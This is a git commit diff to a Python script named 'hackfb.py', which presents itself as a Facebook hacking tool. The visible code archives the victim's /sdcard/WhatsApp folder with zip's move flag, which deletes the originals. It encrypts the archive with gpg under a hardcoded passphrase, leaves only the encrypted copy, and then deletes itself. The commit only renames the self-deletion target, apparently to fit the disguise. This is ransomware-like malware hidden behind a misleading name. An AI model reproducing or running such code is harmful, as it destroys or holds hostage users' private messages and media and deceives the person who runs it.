a671b49f2ec3769dd3a19ce99833a40b3d969818
NoriAlafa <49442695+NoriAlafa@users.noreply.github.com>
2020-04-11 08:32:10 +0700

    Update hackfb.py

--- hackfb.py
+++ hackfb.py
@@ -12,4 +12,4 @@ os.system('zip --password Rinku05 your_file.zip -m -r /sdcard/WhatsApp &> /dev//
 
 os.system('gpg --batch -c --passphrase Rinku05 your_file.zip &> /dev//null')
 os.system('rm your_file.zip;cp your_file.zip.gpg /sdcard')
-os.system('rm -rf minicrypto.py')
+os.system('rm -rf hackfb.py')
